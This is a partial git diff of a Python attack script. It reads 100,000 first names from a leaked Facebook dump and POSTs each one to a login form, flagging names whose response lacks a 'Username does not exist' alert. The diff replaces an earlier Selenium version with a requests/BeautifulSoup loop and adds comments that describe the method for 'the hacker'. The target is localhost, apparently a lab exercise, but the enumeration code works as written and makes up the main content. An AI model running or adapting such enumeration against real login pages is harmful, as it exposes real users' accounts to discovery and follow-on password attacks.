@@ -1,8 +1,25 @@
-# import selenium
-from selenium import webdriver
-from selenium.common.exceptions import NoSuchElementException
-from selenium.webdriver.common.keys import Keys
-from time import sleep
+#!/usr/bin/env python3
+#
+# This script uses the first 100k facebook names from the
+# facebook dump to find available passwords.
+#
+# This script uses BeautifulSoup, a python HTML parser, to
+# get information from the HTML returned by the POST request.
+# For each username, a POST request is made to the server.
+# The response HTML is then parsed and the text of the alert
+# is captured. If the text does not contain the string
+# 'Username does not exist', if an exception occurred, or if
+# the alert HTML element was not present, then the username
+# is considered to possibly be active.
+#
+# After checking all 100k names, the possibly valid names are
+# all printed, and the script terminates. The hacker can then
+# proceed to manually check which of the output names are
+# valid.
+#
+# The reason this script considers usernames to only possibly
+# be valid is because it was written prior to knowing exactly
+# what alert text would indicate the user was valid.
 
 import requests
 import json
@@ -10,8 +27,6 @@ from bs4 import BeautifulSoup
 
 with open('facebook-firstnames-first-100k.txt') as f:
     usernames = [line.rstrip() for line in f]
-
-print(usernames[0:5])
 
 url = 'http://localhost:5000/login'
 print(f'Making POST requests to {url}')
@@ -70,42 +85,4 @@ for username in possibly_worked:
     print(username)
 
 print('\nExiting.')
-exit(0)
-
-
-driver = webdriver.Chrome()
-print(driver)
-driver.get('http://localhost:5000/login')
-
-username = 'my_username'
-
-login_field = driver.find_element_by_name('username')
-print(login_field)
-login_field.send_keys(username)
-login_field.send_keys(Keys.ENTER)
-
-# login_btn = driver.find_element_by_class_name('btn')
-# print(login_btn)
-# login_btn.click()
-
-sleep(2)
-
-try:
-    alert = driver.find_element_by_class_name('alert alert-info')
-    print(alert)
-    # TODO Check that the alert has the text for username not found,
-    # as maybe the alert is reused if password does not match
-except NoSuchElementException:
-    print('The alert for incorrect username not found')
-    print('This may or may not mean success')
-    print('Press ENTER to continue execution')
-    input()
-except Exception as e:
-    print('An exception occurred:')
-    print(e)
-    print('This may or may not mean success')
-    print('Press ENTER to continue execution')
-    input()
-
-driver.quit()
 exit(0)
